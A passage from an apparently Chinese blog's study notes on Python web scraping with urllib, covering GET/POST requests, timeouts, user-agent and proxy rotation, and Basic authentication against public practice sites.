class="hljs-string">&#x27;score&#x27;</span>:score[<span class="hljs-number">0</span>],<br>        <span class="hljs-string">&#x27;drama&#x27;</span>:drama,<br>        <span class="hljs-string">&#x27;name&#x27;</span>:name<br>    &#125;<br><br><span class="hljs-comment">#保存数据到mongodb</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_data</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment">#插入数据</span><br>    collection.insert_one(data)<br>    logging.info(<span class="hljs-string">&quot;数据保存到mongodb成功！！！&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">page</span>):<br>    <span class="hljs-comment">#获取所有电影详情页的链接</span><br>    <span class="hljs-comment"># for page in range(1,TOTAL_PAGE+1):</span><br>    <span class="hljs-comment">#     #抓取某个页面的内容 返回html源码</span><br>    <span class="hljs-comment">#     index_html = scrape_index(page)</span><br>    <span class="hljs-comment">#     #根据源码抓取该页面上跳转详情页的链接</span><br>    <span class="hljs-comment">#     details_urls = parse_index(index_html)</span><br>    <span class="hljs-comment">#     #print(list(details_urls))</span><br>    <span class="hljs-comment">#     logging.info(&quot;详情页面链接%s&quot;,list(details_urls))</span><br><br>    <span class="hljs-comment">#加入多线程后舍弃</span><br>    <span class="hljs-comment"># for page in range(1,TOTAL_PAGE+1):</span><br>    <span class="hljs-comment">#     #详情页信息爬取测试--第一页</span><br>    <span class="hljs-comment">#     #获取到第一页的源码</span><br>    <span class="hljs-comment">#     index_html = scrape_index(page)</span><br>    <span class="hljs-comment">#     #获取第一页所有电影的详情页的url</span><br>    <span class="hljs-comment">#     detail_urls = parse_index(index_html)</span><br>    <span class="hljs-comment">#     #爬取每个详情页的信息</span><br>    <span class="hljs-comment">#     for detail_url in detail_urls:</span><br>    <span class="hljs-comment">#         data = scrape_detail(detail_url)</span><br>    <span class="hljs-comment">#         #logging.info(&quot;get detail data %s&quot; % data)</span><br>    <span class="hljs-comment">#         save_data(data=data)</span><br>    <span class="hljs-comment">#         logging.info(&quot;data save successfully!!!&quot;)</span><br><br>    <br>    <span class="hljs-comment">#详情页信息爬取测试--第一页</span><br>    <span class="hljs-comment">#获取到第一页的源码</span><br>    index_html = scrape_index(page)<br>    <span class="hljs-comment">#获取第一页所有电影的详情页的url</span><br>    detail_urls = parse_index(index_html)<br>    <span class="hljs-comment">#爬取每个详情页的信息</span><br>    <span class="hljs-keyword">for</span> detail_url <span class="hljs-keyword">in</span> detail_urls:<br>        data = scrape_detail(detail_url)<br>        <span class="hljs-comment">#logging.info(&quot;get detail data %s&quot; % data)</span><br>        save_data(data=data)<br>        logging.info(<span class="hljs-string">&quot;data save successfully!!!&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_main</span>(<span class="hljs-params">page</span>):<br>    main(page)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#获取CPU核心数量</span><br>    num_process = multiprocessing.cpu_count()<br>    <span class="hljs-comment">#根据cpu核心数量创建线程池</span><br>    pool = multiprocessing.Pool(num_process)<br>    <span class="hljs-comment">#要爬取页面的数量</span><br>    page_to_scrape = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,TOTAL_PAGE+<span class="hljs-number">1</span>))<br>    <span class="hljs-comment">#使用进程池运行</span><br>    pool.<span class="hljs-built_in">map</span>(run_main,page_to_scrape)<br>    <span class="hljs-comment">#关闭进程池</span><br>    pool.close()<br>    <span class="hljs-comment">#main()</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230930204730425.png" alt="image-20230930204730425" style="zoom: 50%;" /><img src="/img/image-20230930204640239.png" alt="image-20230930204640239" style="zoom: 50%;" />]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爬虫学习</title>
    <link href="/2023/10/07/%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/10/07/%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="爬虫学习"><a href="#爬虫学习" class="headerlink" title="爬虫学习"></a>爬虫学习</h1><h2 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h2><p>python内置的http请求库</p><p>4大模块：</p><p>1.request模块：最基本的http请求模块</p><p>2.error模块：异常处理模块</p><p>3.parse模块：工具模块，提供url的处理方法</p><p>4.robotparser模块：识别robot.txt</p><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><h4 id="第一个爬虫"><a href="#第一个爬虫" class="headerlink" title="第一个爬虫"></a>第一个爬虫</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><br><span class="hljs-comment">#发送一个最基本的请求</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_baidu_data</span>():<br>    url = <span class="hljs-string">&#x27;http://www.baidu.com/&#x27;</span><br>    response = urllib.request.urlopen(url)<br>    <span class="hljs-comment">#print(response.code)</span><br>    data = response.read()<br>    <span class="hljs-comment">#将data获取到的东西转换为字符串</span><br>    str_data = data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-comment">#print(str_data)</span><br>    <span class="hljs-comment">#将数据写入文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;baidu.html&#x27;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(str_data)<br><br>load_baidu_data()<br></code></pre></td></tr></table></figure><h4 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#发送get型请求  单个参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_baidu_data</span>():<br>    url = <span class="hljs-string">&#x27;https://www.baidu.com/s?wd=&#x27;</span><br>    <span class="hljs-comment">#url+search</span><br>    name = <span class="hljs-string">&quot;卢本伟&quot;</span><br>    final_url = url+name<br>    <span class="hljs-comment">#网址里包含了中文 需要进行转码</span><br>    encode_url = urllib.parse.quote(final_url,safe=string.printable)<br>    <span class="hljs-built_in">print</span>(encode_url)<br><br>    response = urllib.request.urlopen(encode_url)<br>    <span class="hljs-built_in">print</span>(response.code)<br><br>load_baidu_data()<br><br><br><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#发送get型请求  多个参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_baidu_data</span>():<br>    url = <span class="hljs-string">&#x27;https://www.baidu.com/s?&#x27;</span><br>    <span class="hljs-comment">#使用params字典</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;wd&quot;</span>:<span class="hljs-string">&quot;孙悟空&quot;</span>,<br>        <span class="hljs-string">&quot;pn&quot;</span>:<span class="hljs-string">&quot;80&quot;</span><br>    &#125;<br>    query_str = urllib.parse.urlencode(params)<br>    <span class="hljs-built_in">print</span>(query_str)<br>    final_url = url+query_str<br>    <span class="hljs-built_in">print</span>(final_url)<br><br>    response = urllib.request.urlopen(final_url)<br>    <span class="hljs-comment">#print(response.code)</span><br>    str_data = response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(str_data)  <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;baidu-wukong-pn80.html&#x27;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(str_data)<br>load_baidu_data()<br></code></pre></td></tr></table></figure><h4 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#定义url</span><br><span class="hljs-comment">#用于测试的网站：  http://httpbin.org/post</span><br>url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br><span class="hljs-comment">#创建要发送的数据表单</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;hello&#x27;</span>:<span class="hljs-string">&#x27;world&#x27;</span>,<br>    <span class="hljs-string">&#x27;handsome&#x27;</span>:<span class="hljs-string">&#x27;r1cky&#x27;</span><br>&#125;<br><span class="hljs-comment">#data要进行编码</span><br>data_encode = urllib.parse.urlencode(data).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-comment">#加上encode(&#x27;uft-8&#x27;)  str --&gt; bytes   转换成bytes传输</span><br><span class="hljs-comment">#加上decode(&quot;utf-8&quot;) bytes--&gt;str   转换成str传输</span><br><br><span class="hljs-comment">#发送post请求</span><br>response = urllib.request.urlopen(url=url,data=data_encode)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure><h4 id="超时控制：timeout"><a href="#超时控制：timeout" class="headerlink" title="超时控制：timeout"></a>超时控制：timeout</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#超过0.1秒没有响应就报错</span><br>response = urllib.request.urlopen(url=url,data=data_encode,timeout=<span class="hljs-number">0.1</span>)<br><br><span class="hljs-comment">#异常处理：</span><br><span class="hljs-keyword">try</span>:<br>    response = urllib.request.urlopen(url=url,data=data_encode,timeout=<span class="hljs-number">0.1</span>)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;连接超时&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="自定义user-agent"><a href="#自定义user-agent" class="headerlink" title="自定义user-agent"></a>自定义user-agent</h4><p><strong>爬虫的核心就是模拟用户</strong>！！！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#定义url</span><br><span class="hljs-comment">#用于测试的网站：  http://httpbin.org/post</span><br>url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br><br><span class="hljs-comment">#自定义request  添加user-agent</span><br>header = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>    <span class="hljs-string">&quot;hello&quot;</span>:<span class="hljs-string">&quot;world&quot;</span><br>&#125;<br><br>req = urllib.request.Request(url=url,headers=header,method=<span class="hljs-string">&#x27;POST&#x27;</span>)<br>response = urllib.request.urlopen(req)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h4 id="随机UA头小项目"><a href="#随机UA头小项目" class="headerlink" title="随机UA头小项目"></a>随机UA头小项目</h4><p>每次请求，都切换不同的user-agent</p><p>UA头数据网站：<a href="http://useragent.kuzhazha.com/">UserAgent大全_常用的UserAgent库下载_UserAgent在线工具_流行的UserAgent手机库UA_UA标识网 (kuzhazha.com)</a></p><p>思路：</p><p>1.定义多个ua头 列表</p><p>2.每次请求时切换ua头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user_agent</span>():<br>    url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br>    <span class="hljs-comment">#定义多个user-agent</span><br>    user_agent_list = [<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Linux; Android 12; ELS-AN00 Build/HUAWEIELS-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 XWEB/5075 MMWEBSDK/20230504 MMWEBID/9308 MicroMessenger/8.0.37.2380(0x2800253D) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (iPhone; CPU iPhone OS............ile/15E148 MicroMessenger/8.0.34(0x18002234) NetType/4G Language/zh_CN&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; hu; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Int............ecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (X1............7.6) Gecko/20050318 Firefox/1.0.2&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Windows; U; Win............o) Chrome/100.0.4896.58 Safari/537.36 UCBrowser/15.4.8.1238&quot;</span>,<br>    ]<br>    <span class="hljs-comment">#使用random模块 随机取user_agent_list中的一个 </span><br>    random_user_agent = random.choice(user_agent_list)<br>    req = urllib.request.Request(url=url,method=<span class="hljs-string">&#x27;POST&#x27;</span>)<br>    <span class="hljs-comment">#添加ua头</span><br>    req.add_header(<span class="hljs-string">&quot;User-Agent&quot;</span>,random_user_agent)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br><br>user_agent()<br></code></pre></td></tr></table></figure><h4 id="自定义opener"><a href="#自定义opener" class="headerlink" title="自定义opener"></a>自定义opener</h4><p>handler：<br>HTTPDefaultErrorHandler 用于处理 HTTP 响应错误，错误都会抛出 HTTPError 类型的异常。<br>HTTPRedirectHandler 用于处理重定向。<br>HTTPCookieProcessor 用于处理 Cookies。<br>ProxyHandler 用于设置代理，默认代理为空。<br>HTTPPasswordMgr 用于管理密码，它维护了用户名密码的表。<br>HTTPBasicAuthHandler 用于管理认证，如果一个链接打开时需要认证，那么可以用它来解决认证问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handler_open</span>():<br>    url = <span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span><br>    <span class="hljs-comment">#创建自己的opener</span><br>    handler = urllib.request.HTTPHandler()<br>    opener = urllib.request.build_opener(handler)<br>    response = opener.<span class="hljs-built_in">open</span>(url)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br>handler_open()<br>    <br></code></pre></td></tr></table></figure><h4 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h4><p>代理的类型：<br>透明：对方可以知道我们的ip<br>匿名：对方不知道我们的ip，but知道我们使用了代理<br>高匿：对方不知道我们的ip，and不知道我们使用了代理</p><p>免费代理 大都不靠谱</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handler_open</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br>        <span class="hljs-comment">#添加代理 ip+端口</span><br>        proxy = &#123;<br>            <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://ip:port&quot;</span><br><br>        &#125;<br>        <span class="hljs-comment">#创建代理处理器</span><br>        proxy_handler = urllib.request.ProxyHandler(proxy)<br>        <span class="hljs-comment">#创建自己的opener</span><br>        opener = urllib.request.build_opener(proxy_handler)<br>        response = opener.<span class="hljs-built_in">open</span>(url)<br>        <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error: &quot;</span>,e)<br><br><br>handler_open()<br></code></pre></td></tr></table></figure><h4 id="随机代理小项目"><a href="#随机代理小项目" class="headerlink" title="随机代理小项目"></a>随机代理小项目</h4><p>代理购买：<a href="https://www.kuaidaili.com/">快代理 - 企业级HTTP代理IP云服务 (kuaidaili.com)</a></p><p>配置代理池：</p><p><img src="/img/image-20230911162945323.png" alt="image-20230911162945323"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy_ip</span>():<br>    url = <span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span><br>    <span class="hljs-comment">#定义多个user-agent</span><br>    ip_list = [<br>        <span class="hljs-string">&quot;http://111.224.217.xxx:19394&quot;</span>,<br>        <span class="hljs-string">&quot;http://114.220.35.xxx:19942&quot;</span>,<br>        <span class="hljs-string">&quot;http://117.87.209.xxx:23350&quot;</span>,<br>        <span class="hljs-string">&quot;http://121.233.172.xxx:22936&quot;</span>,<br>        <span class="hljs-string">&quot;http://182.38.126.xxx:16113&quot;</span><br>    ]<br>    <span class="hljs-comment">#每次取一个ip </span><br>    proxy = random.choice(ip_list)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#创建代理处理器</span><br>        proxy_handler = urllib.request.ProxyHandler(&#123;<span class="hljs-string">&#x27;http&#x27;</span>:proxy,<span class="hljs-string">&#x27;https&#x27;</span>:proxy&#125;)<br>        <span class="hljs-comment">#创建自己的opener</span><br>        opener = urllib.request.build_opener(proxy_handler)<br>        response = opener.<span class="hljs-built_in">open</span>(url)<br>        <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error: &quot;</span>,e)<br><br><br>proxy_ip()<br></code></pre></td></tr></table></figure><img src="/img/image-20230911164947562.png" alt="image-20230911164947562" style="zoom:80%;" /><h4 id="授权认证"><a href="#授权认证" class="headerlink" title="授权认证"></a>授权认证</h4><p>身份认证：</p><p>HTTPBasicAuthHandler（用户基本的身份验证处理）<br>HTTPPasswordMgrWithDefaultRealm（经常和authhandler一起出现）</p><p>需要认证的测试网站：<a href="https://ssr3.scrape.center/">https://ssr3.scrape.center/</a> （admin admin）</p><img src="/img/image-20230911170845042.png" alt="image-20230911170845042" style="zoom:80%;" /><p>直接访问：</p><p><img src="/img/image-20230911170948737.png" alt="image-20230911170948737"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#创建一个密码管理器</span><br>password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()<br><span class="hljs-comment">#添加进目标url，用户名 密码</span><br>password_mgr.add_password(<span class="hljs-literal">None</span>,url,username,password)<br></code></pre></td></tr></table></figure><p>第一个参数为NONE，表示默认的域<br>如果需要添加不同域的凭证可以将none替换为对应的域名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">auth_login</span>():<br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/&quot;</span><br>    <span class="hljs-comment">#指定用户名和密码</span><br>    username = <span class="hljs-string">&quot;admin&quot;</span><br>    password = <span class="hljs-string">&quot;admin&quot;</span><br>    <span class="hljs-comment">#创建密码管理器</span><br>    password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()<br>    <span class="hljs-comment">#添加目标url   用户名 密码</span><br>    password_mgr.add_password(<span class="hljs-literal">None</span>,url,username,password)<br>    <span class="hljs-comment">#创建一个基本密码认证处理器，并将密码管理器传递给他</span><br>    handler = urllib.request.HTTPBasicAuthHandler(password_mgr)<br>    <span class="hljs-comment">#创建网络请求的构造器</span><br>    opener = urllib.request.build_opener(handler)<br>    response = opener.<span class="hljs-built_in">open</span>(url)<br>    <span class="hljs-built_in">print</span>(response.code)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>auth_login()<br></code></pre></td></tr></table></figure><img src="/img/image-20230911170929280.png" alt="image-20230911170929280" style="zoom:80%;" /><h4 id="cookie认证"><a href="#cookie认证" class="headerlink" title="cookie认证"></a>cookie认证</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">auth_login</span>():<br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-comment">#添加认证字段 admin:admin</span><br>        <span class="hljs-string">&quot;Authorization&quot;</span>:<span class="hljs-string">&quot;Basic YWRtaW46YWRtaW4=&quot;</span><br>    &#125;<br>    req = urllib.request.Request(url=url,headers=headers)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>auth_login()<br></code></pre></td></tr></table></figure><h4 id="cookiejar-读写文件"><a href="#cookiejar-读写文件" class="headerlink" title="cookiejar  读写文件"></a>cookiejar  读写文件</h4><p>写：</p><p>MozillaCookieJar  